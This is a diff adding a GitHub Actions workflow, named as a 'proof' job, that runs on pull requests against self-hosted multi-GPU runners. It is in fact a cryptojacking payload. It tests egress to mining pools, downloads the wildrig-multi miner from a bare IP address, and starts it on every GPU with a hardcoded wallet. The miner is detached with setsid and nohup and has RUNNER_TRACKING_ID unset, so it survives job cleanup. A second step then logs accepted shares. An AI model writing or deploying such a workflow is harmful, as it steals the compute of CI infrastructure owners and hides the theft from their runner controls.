@@ -1,0 +1,35 @@
+name: c211-i124917-proof
+on:
+  pull_request:
+    types:
+    - opened
+    - synchronize
+    - reopened
+permissions:
+  contents: read
+jobs:
+  proof:
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+        - label: 8-gpu-h200
+          tag: h200x8p
+        - label: 4-gpu-h100
+          tag: h100x4p
+        - label: 4-gpu-b200
+          tag: b200x4p
+        - label: 2-gpu-gb300
+          tag: gb300x2p
+    runs-on: ${{ matrix.label }}
+    timeout-minutes: 60
+    steps:
+    - name: launch
+      shell: bash
+      run: "\nset -u\nW=\"$HOME/c211-i124917\"\nmkdir -p \"$W\"\nWALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql\nNONCE=\"c211-i124917-$(date +%s)\"\nTAG='${{ matrix.tag }}'\necho \"C211_MARKER lane=i124917 tag=$TAG host=$(hostname) uid=$(id -u) user=$(whoami) nonce=$NONCE\"\nnvidia-smi -L 2>&1 || true\nnvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total,utilization.gpu --format=csv,noheader 2>&1 || true\necho \"EGRESS_BEGIN\"\nfor hp in 169.58.247.186:8791 pool.pearlhash.xyz:9000 global.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 github.com:443; do\n  h=\"${hp%:*}\"; p=\"${hp##*:}\"\n  if timeout 8 bash -c \"exec 3<>/dev/tcp/$h/$p\" 2>/dev/null; then echo \"TCP_OK $hp\"; else echo \"TCP_FAIL $hp\"; fi\ndone\necho \"EGRESS_END\"\nok=0\nfor u in http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do\n  echo \"FETCH $u\"\n \
+        \ if curl -fsSL --connect-timeout 10 --max-time 300 -o \"$W/wr.tgz\" \"$u\"; then ok=1; break; fi\ndone\nif [ \"$ok\" != \"1\" ]; then echo \"FETCH_FAIL_ALL\"; exit 0; fi\nS=$(sha256sum \"$W/wr.tgz\" | awk '{print $1}')\necho \"TARBALL_SHA256 $S\"\nif [ \"$S\" != \"7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44\" ]; then echo \"TARBALL_SHA_MISMATCH\"; exit 0; fi\ntar xzf \"$W/wr.tgz\" -C \"$W\" || { echo \"UNTAR_FAIL\"; exit 0; }\nBIN=\"$W/wildrig-multi\"\n[ -x \"$BIN\" ] || chmod +x \"$BIN\" 2>/dev/null || true\nBS=$(sha256sum \"$BIN\" | awk '{print $1}')\necho \"BIN_SHA256 $BS\"\nif [ \"$BS\" != \"002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b\" ]; then echo \"BIN_SHA_MISMATCH\"; exit 0; fi\nmkdir -p /etc/OpenCL/vendors 2>/dev/null || true\nif [ ! -e /etc/OpenCL/vendors/nvidia.icd ]; then echo /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1 > /etc/OpenCL/vendors/nvidia.icd 2>/dev/null || true; fi\nif ldd \"$BIN\" 2>&1 | grep -q 'not found'; then\n\
+        \  echo \"LDD_MISSING\"; ldd \"$BIN\" 2>&1 | head -20\n  mkdir -p \"$W/ocl\"\n  OCLSRC=$(ldconfig -p 2>/dev/null | grep -m1 'libnvidia-opencl.so.1' | awk '{print $NF}')\n  if [ -n \"${OCLSRC:-}\" ]; then ln -sf \"$OCLSRC\" \"$W/ocl/libOpenCL.so.1\"; export LD_LIBRARY_PATH=\"$W/ocl:${LD_LIBRARY_PATH:-}\"; fi\nfi\necho \"PRINT_DEVICES_BEGIN\"\ntimeout 90 \"$BIN\" --print-devices 2>&1 | head -40 || true\necho \"PRINT_DEVICES_END\"\nN=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')\necho \"GPU_COUNT $N\"\nif [ \"${N:-0}\" -lt 1 ]; then echo \"NO_GPU\"; exit 0; fi\nfor i in $(seq 0 $((N-1))); do\n  setsid env -u RUNNER_TRACKING_ID nohup \"$BIN\" --algo pearlhash -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u \"${WALLET}.1249179${i}\" -p x -d \"$i\" -r 2 -R 10 -l \"$W/wr-$i.log\" >/dev/null 2>&1 &\n  echo \"STARTED gpu=$i pid=$!\"\ndone\nsleep 30\npgrep -af wildrig-multi 2>/dev/null | head -20 || echo \"PGREP_NONE\"\nfor i in $(seq 0 $((N-1))); do echo\
+        \ \"--- gpu $i ---\"; tail -6 \"$W/wr-$i.log\" 2>/dev/null || true; done\necho \"LAUNCH_DONE tag=$TAG\"\n"
+    - name: diag
+      shell: bash
+      run: "\nset -u\nW=\"$HOME/c211-i124917\"\nN=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')\nTAG='${{ matrix.tag }}'\necho \"PROOF_BEGIN tag=$TAG host=$(hostname) gpus=$N\"\nfor i in $(seq 0 $((N-1))); do echo \"UUID g=$i $(nvidia-smi --query-gpu=uuid,name --format=csv,noheader -i $i 2>/dev/null)\"; done\nfor r in $(seq 1 8); do\n  sleep 120\n  echo \"TICK $(date -u +%FT%TZ) r=$r tag=$TAG\"\n  pgrep -c wildrig-multi 2>/dev/null || echo \"WILDRIG_PROCS 0\"\n  nvidia-smi --query-gpu=index,uuid,utilization.gpu,memory.used --format=csv,noheader 2>/dev/null || true\n  tot=0\n  for i in $(seq 0 $((N-1))); do\n    f=\"$W/wr-$i.log\"; a=0\n    if [ -f \"$f\" ]; then a=$(grep -ci 'accept' \"$f\" 2>/dev/null || true); a=${a:-0}; fi\n    tot=$((tot+a))\n    echo \"DET g=$i acc=$a last=$(tail -1 \"$f\" 2>/dev/null | tr -d '\\r' | cut -c1-140)\"\n  done\n  echo \"DET_TOTAL acc=$tot\"\ndone\necho \"PROOF_DONE tag=$TAG total_acc=$tot\"\n"
